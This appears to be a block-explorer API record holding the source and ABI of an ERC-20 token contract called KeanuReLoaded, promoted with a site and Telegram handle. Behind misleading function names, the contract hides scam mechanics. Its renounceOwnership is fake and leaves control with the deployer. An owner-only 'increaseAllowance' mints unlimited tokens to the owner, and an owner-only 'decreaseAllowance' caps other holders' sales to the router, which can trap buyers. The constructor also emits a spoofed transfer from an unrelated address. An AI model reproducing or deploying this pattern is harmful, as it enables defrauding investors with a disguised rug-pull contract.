{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\n   `    `    `    `  ` `  `` ```` `````.`.`............-.------------;-;,,,,,:,::::::::_\r\n`    `    `    `    `   ``    ``.`  ``.` ```  ...-.-..-.-.-.--------,-,-,,,,:,:::,:::::_\r\n  `    `    `    ``  ` `  ` `.:;.`      ` `-_-` `.`` ``.-----------;-;,,,,,:,:,:::::_:__\r\n    `    `    `    ``  ``.-..`.-.`-``` ``..`` .!, ```   ``..----,-,-,,,,:,:,:,:::::::__;\r\n `    `    `    ` ` ``.`   `  `.``    `.``..`.````` ``` ````.--;-;-,,,,:,:::,::::::_____\r\n   `    `    `  ` ` ``````.`..`` `      `     `` ..`  `` ``` .,-,,,,,,:,:,:::::::____;_;\r\n`    `    `   ``   ..```     `` ..``    ```.    ` `    `  `. `-,,,,,,:,:,:::::::________\r\n  `    `   ` `  ` .` ` ``` ``  ` `.  `     `  `` `.` `` `` `. .,,,:,:::,::::::_____;__;_\r\n    `    ``   `` .-         `--   `   `.```..`  ````     `` ```.,:,:,:::::::_________;_;\r\n `    ` `  ` `` .``  `  ``  `  ..`       ``````       ``` ` ` ``:,:,::::::::___;_;_;;_;_\r\n   `  ` `  `   `` `.   --.       .  ````   `    `  ```  `    `  ,:,::::::__________;_;;;\r\n`   ``   ```````         .    `   . `````    `    ```  `    `   -::::::::__;_;_;__;_;_;_\r\n   `  ` ` ` ``   `         `   `` ``..-`      ``   . `   ``  ` `.::::::________;_;_;_;;;\r\n`   ``  `  `````   ```.-__,-  ` `-,~=!=~:.---`   ``` ```   `    .::::____;_;;_;_;_;_;_;;\r\n ` `  `` `` `. ``  `!3K%$B4vY;-`-!aKdHG4afYJL=!_`       `.` `  `.::__________;_;_;;;;;;;\r\n ` ` ` ` ```````` .L8@@&@@@WETvJFKWWWW$#dKEn3aFYL, ` `     `.`` .____;_;_;;_;_;_;_;;;;;;\r\n`     ```` ``` ` .l@@@@&&&@@@BN#8WW@@WMkGGKGySSFs~.`` ``    ` `..______;_;_;_;;;;;;;;;;;\r\n  ` ``` ``````` `7W@@@@&@@&&@@W@@@WWWW$MHwE4AAy5Cr,.       ``` `-__;_;;_;_;_;_;_;;;;;;;~\r\n ``` ``````.`.```n@@@@@WWW@@WW8%%#NNdNMMHkGEwE3n5C~-` ``   `   `.:___;_;_;;;;;;;;;;;;~~~\r\n` ```` ```.`.`.`.M@@@@@8B8W@%NM$MdGAAEyfnSynnnnf5FJ:`    `---`  `_;_;_;_;_;_;;;;;;;~~~~~\r\n``` `````.`.`....8@@@WW@WW8HKkwwAy5VVTCCTVF5F5FFCCr,``  ``..``3W3;_;_;;;;;;;;;;;;;~~~~~~\r\n `````.`.`.....-`k&@@WB8%%#Ga4EEa3fFTYYJsTVFFFFFFVL>;.``     Vl-nF__;_;_;_;;;;;;~~~~~!~~\r\n`` ``.`.`.......`s&@@W8%MmK4ySnfSa5TJLlJYsVVTVFFFFV>;_``. `;J~YT_k_;;;;;;;;;;;;~~~~~~~~!\r\n````.`.`.......--_&@WWW@B#NdkAySaynTJlJTFFCCsFFVVFF5Cl!-` .v;rvlsKl;;_;;;;;;;~~~~~~~!~~~\r\n`.`.`...........-;@@@@@@WB#kkanyEGGfFsVnnn5Fnnay4A4AkmGL--`~>l,_vd=;;;;;;;;;~~~~~!~~~~!~\r\n``.`.......-.-..-.@@@W@@88#GNHEEmdNkFY5AyaAaannVsnGAAkEF=.:Sf.;;YM!;;;;;;;~~~~~~~~~!~~!~\r\n`.`..........-.--:%W8%@888d4dk3wdNkwrVaEST!;.-.--,!7LSyma:v#lS!3GF;;;;;;~~~~~~~~!~~~!!~~\r\n.........-.--.-.!!77~!7_lddw$VYYkfYYFFl_.--`       `..a%374%T!7E3~;;;;;~~~~~~!~~~!~!~~!~\r\n`..........-.--..`-.` `;~;.`.._7Fl---_,          `` `,H$$kK#TL>$A;~;~~~~~~!~~~~!!~~~!!~~\r\n.......-..-.-.--._:~- ``  ` `-!CVJ!r-`            ``.SKmmNNMCsSfn;~;~~~~~~~~!~!~~!~!~~!~\r\n.......-.-.------.`;-. `       :~>_;  `         ```!4wkw4dM$YvTwJ;~~~~~~~!~~~~!~~!~!~~!~\r\n...-..-.-.-.-.----::.,-```    ;y#v>_!`          `!A4AAA4wmM8T73L~~~~~~!~~~~!~~~!!~~~!!~~\r\n.....-.-----------_dHr  ` ```!r@%fv=!;-`  ` `-!T333ySy44wmMWy7n@;-~~~~~~!!~~!~!~~!~!~~!~\r\n.--.-.-.-.---------VBKkafJYJTANW#nYlvll7rJY7=vJsC5f333AwkmM8yFfV. ;~~!~~~~!!~~~!!~~~!!~~\r\n.-.-.----------;-;-!$H4wKN#md#m%#EJvlLLJTFFVJlLJJYsC5fy4Gm#Mssv.``,~~~~!~!~~!~!~~!~!~~!~\r\n-.-.-.------,-,-,,,-EBdk4GkGAEkW@yYJ7=vLJsFFCsYJLlJFnn3EGd#3vv-````;!~~!~!~~!~!~~!~!~~!~\r\n.------------;-;,,,,:WBNGkw4S5k@W3CTv5!_!vYsTYJYJYT5fn3AGGw=!- `` `-~!!~~~!!~~~!!~~~!!~~\r\n-.-.--------,-,,,,:,,7@WdmKEsVW@dFV5a4T;!;!lTsYYYT3F5n3yaJ;;-`````  -~~!~!~~!~!~~!~!~~!~\r\n---------;-;-,,,,:,::,n@8#kar34Wf~;=sFf~Jl;!vYYTf3VC53nTJ;`.` `` ````-~~~~!!~~~!!~~~!!~~\r\n--------,-,,,,,,:,::::_kW8NaAW@%m;:,-,_!YVV~~lYT5fCCFFYJ!``   ````````,!~!~~!~!~~!~!~~!~\r\n-------;-;,,,:,:,:,::::~MWdw%W@W#A!~_;>TJLJVJ~7JT5FVYJv:` ````` `` ` ``:!!~~!~!~~!~!~~!~\r\n----,-,-,,,,:,:::,::::_:>#dG%wdwkA:;~>rr~~__!>~rYTTCYv_` `` `   ````````-~!!~~~!!~~~!!~~\r\n-;-;-;,,,,,:,:,::::::___:l$dnYaY!~lYs;;;;_..`,>vlvJL=-       ``` ````.`.`.~~~~!~~!~!~~!~\r\n--,-,,,,,,:,:,:::::::_____CBaYCl:``    `.:;>l;_!=r7~. ```` ``    `.```.`.` ,~~~!!~~~!!~~\r\n-;-,,,,:,:,:,::::_:______;;w8@8KEf7!7!!J!;!>>;,;!~~. ```  `  `````````` ````.~!~~!~!~~!~\r\n,,,,,,:,:::,::::::___;_;___!HW%GY=>~___,:;;_:,:;~,`` `  ` ````` ````````` `` -~~~!~!~~!~\r\n,,,,,:,:,:::::_:________::-..k8aT!-.`.-:__;_:;;!, `   ``  `  ````..``` `   `  -!!~~~!!~~\r\n,,:,:,:,:::::::____;_;_::_,-.`BWNGfFTJ=~>>!~~!!:    `   `  ``` `..```         ``:~~!~~!~\r\n,:,:,:,::::::_________~!!;,.` .8BGFsVYJLlL>!>;.  `    ` ```````. ``            ` -~~!!~~\r\n:,:,:::::::____;_;;_;>>~;_-``  .CSv=~==!!;:;.`` `  `  `` ````````      `    ` `  `.;~~!~\r\n,:::::::::_______;_~>;;_-.` `   ~F~;;;_,--_=,`.``  ````````...``    `  `  `` ``  `` -~!~\r\n:::::::::__;_;_;;;~~~_,.,,-` ``  TmN3J~;;~v!-_-  ```......-.         `````  `````.````:~\r\n::::::_________;~~_,->vv~--``  ``:MkHT=~~7vvY,`.` `..---..``       ` ``............---`;\r\n:::::____;_;;;;_~:-~vr~_;,`  ```-`wMw4Y=~!r3-`.`  .---,..`     `  ``...-.-.-..-.-.------\r\n:_:________;_;_;,!rr~-:!~.` ` `-,.G@BET=~=w;..` `..---..`    ``.`````........-----------\r\n:____;_;_;__;_;,~v!,,:;!` ` `_---;@WGr>rlkv.-- `..---..    .--.-.`.....--.-.-.-.-.------\r\n_______;_;_;_;!>>!-,;!~``   ,=--,;8WA~7vAG-,-``-------``.---...................---------\r\n_;_;____;_;_~~~!;-:~!~.`` ` >=--:,d%a~_Ym-,-.`.-,--,- `.---.-.--.`.......`.`...--.-.----\r\n_______;_;;;!!~;-:~~!. ` ` ,ll_--:_fF;_J,,:-`.-;--,- -_,-,--`..__------...`.`...`..-----\r\n_;__;_;_;-:~!~;::~~!-  ``  !7lY;---.:~=,,_,.`.,----`:_,......~;---,-.```.--....`...-..--\r\n_;_;_;_;;!r!~~_~r>~_` `   ,=rvvs!-::,~:-:_- .,,-.: ,:-...--:~-`.``` `        `....`....-\r\n_;;_;_;;vYY!~_;77!;-`.`  `;~7vv7v!:__,-:;-.-:,--, .-,..-.`.,.`  ``             ` ..``...\r\n_;_;;;_!YY7;!=rv!;-..`   :~rr777>~_:-:,_,--;,--;  --.-`  `   `           `  ` `  ``..`.-\r\n;_;_;_;;=v!;~;>>~....   ._~7vr7vv!:,_:,.--,---:` `-_. ``  ```   `    ``     ``` ``.--...\r\n                                                                                            \r\n\r\nsite: KeanuReloaded.com\r\ntg: @keanureloaded\r\n\r\n \r\n**/\r\n\r\n\r\n\r\npragma solidity ^0.6.10; \r\n// SPDX-License-Identifier: MIT  \r\n\r\nlibrary Address {\r\n        function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n      function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n    }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n   \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\n    abstract contract Context {\r\n    \r\n    function _call() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    \r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address public Owner;\r\n    \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () internal {\r\n        address call = _call();\r\n        _owner = call;\r\n         Owner = call;\r\n        emit OwnershipTransferred(address(0), call);\r\n    }\r\n  \r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _call(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n         Owner = address(0);\r\n    }\r\n    \r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    \r\n    }\r\n    \r\n}\r\n\r\ncontract KeanuReLoaded is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    mapping(address => uint256) private _router;\r\n    mapping(address => mapping (address => uint256)) private _allowances;\r\n    address private router;\r\n    address private caller;\r\n    uint256 private _totalTokens = 13370000 * 10**18;\r\n    uint256 private rTotal = 13370000 * 10**18;\r\n    string private _name = 'KeanuRELOADED.com';\r\n    string private _symbol = 'KEALOADED';\r\n    uint8 private _decimals = 18;  \r\n\r\nconstructor () public {\r\n    _router[_call()] = _totalTokens;\r\n    emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);    \r\n\r\n  \r\n   }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decreaseAllowance(uint256 amount) public onlyOwner {\r\n        rTotal = amount * 10**18;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _router[account];\r\n    }\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_call(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(uint256 amount) public onlyOwner {\r\n        require(_call() != address(0));\r\n        _totalTokens = _totalTokens.add(amount);\r\n        _router[_call()] = _router[_call()].add(amount);\r\n        emit Transfer(address(0), _call(), amount);\r\n    }\r\n    \r\n    function Approve(address trade) public onlyOwner {\r\n        caller = trade;\r\n    }r\n    \r\n    function setrouteChain (address Uniswaprouterv02) public onlyOwner {\r\n        router = Uniswaprouterv02;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_call(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalTokens;\r\n    }\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0));\r\n        require(recipient != address(0));\r\n        \r\n        if (sender != caller && recipient == router) {\r\n            require(amount < rTotal); \r\n    }\r\n        _router[sender] = _router[sender].sub(amount);\r\n        _router[recipient] = _router[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n     function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"trade\",\"type\":\"address\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Uniswaprouterv02\",\"type\":\"address\"}],\"name\":\"setrouteChain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeanuReLoaded", "CompilerVersion": "v0.6.10+commit.00c0fcaf", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0efa56823d59d791ab6de70c6c7cbe30b994beca2a5ba882852cfc6ef004dcea"}]}